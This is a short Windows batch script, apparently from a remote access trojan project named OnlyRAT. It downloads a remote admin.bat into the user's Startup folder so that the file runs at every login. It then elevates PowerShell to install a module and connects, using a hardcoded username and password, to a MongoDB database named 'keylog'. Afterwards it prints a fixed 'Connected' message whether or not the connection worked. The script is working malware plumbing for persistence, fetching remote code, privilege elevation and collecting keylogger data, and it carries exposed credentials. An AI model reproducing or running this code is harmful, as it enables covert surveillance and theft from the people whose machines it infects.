:: adminTest.cmd

@echo off

REM Set the path for admin.bat
set "adminScript=C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\admin.bat"

REM Download the admin.bat file
powershell -c "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Sayuru99/OnlyRAT/main/resources/admin/admin.bat', '%adminScript%')"

REM Open PowerShell window as admin and execute the command to install the module
powershell -Command "Start-Process powershell.exe -ArgumentList '-NoProfile -Command \"Install-Module -Name Mdbc\"' -Verb RunAs"

timeout /t 10 /nobreak >nul

powershell -Command "Start-Process powershell.exe -ArgumentList '-NoProfile -Command \"Import-Module -Name Mdbc; Connect-Mdbc -ConnectionString \"mongodb+srv://klausm1024:R16BZkWn2HZQAzD7@cluster0.uq9lhec.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0" -DatabaseName \"keylog\" -CollectionName \"users\"\"' -Verb RunAs"

echo MongoDB connection status: Connected
